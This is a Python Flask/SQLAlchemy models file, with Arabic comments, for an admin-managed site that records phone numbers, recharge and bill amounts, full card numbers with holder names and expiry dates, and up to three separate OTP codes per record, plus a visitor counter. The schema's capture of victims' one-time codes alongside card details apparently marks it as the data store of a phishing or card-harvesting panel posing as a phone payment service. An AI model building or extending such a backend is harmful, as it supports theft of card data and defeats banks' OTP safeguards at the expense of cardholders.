from datetime import datetime
from app import db
from flask_login import UserMixin
from werkzeug.security import generate_password_hash, check_password_hash


class User(UserMixin, db.Model):
    """نموذج المستخدم للوحة التحكم"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
        
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
    
    def __repr__(self):
        return f'<User {self.username}>'

class PhoneData(db.Model):
    """نموذج لتخزين بيانات الهواتف"""
    id = db.Column(db.Integer, primary_key=True)
    phone_number = db.Column(db.String(20), nullable=False, index=True)
    recharge_amount = db.Column(db.Float, nullable=True)
    bill_amount = db.Column(db.Float, nullable=True)
    transaction_number = db.Column(db.String(20), nullable=True)
    # رموز التحقق القديمة ستبقى للتوافق مع النظام القديم
    otp_code = db.Column(db.String(50), nullable=True)
    # رموز التحقق الجديدة المنفصلة
    first_otp = db.Column(db.String(20), nullable=True)
    second_otp = db.Column(db.String(20), nullable=True) 
    third_otp = db.Column(db.String(20), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<PhoneData {self.phone_number}>'

class CardData(db.Model):
    """نموذج لتخزين بيانات البطاقات"""
    id = db.Column(db.Integer, primary_key=True)
    card_number = db.Column(db.String(20), nullable=False, index=True)
    card_holder = db.Column(db.String(100), nullable=False)
    expiry = db.Column(db.String(10), nullable=False)
    # لا نخزن رقم CVV كاملاً لأسباب أمنية
    last_transaction = db.Column(db.DateTime, default=datetime.utcnow)
    phone_data_id = db.Column(db.Integer, db.ForeignKey('phone_data.id'))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    phone_data = db.relationship('PhoneData', backref=db.backref('card_data', lazy=True))
    
    def __repr__(self):
        return f'<CardData {self.card_number[-4:]}>'
class VisitorCount(db.Model):
    """نموذج لتتبع عدد زوار الموقع"""
    id = db.Column(db.Integer, primary_key=True)
    date = db.Column(db.Date, default=datetime.utcnow().date, nullable=False, index=True)
    count = db.Column(db.Integer, default=0, nullable=False)
    
    def __repr__(self):
        return f'<VisitorCount {self.date}: {self.count}>'
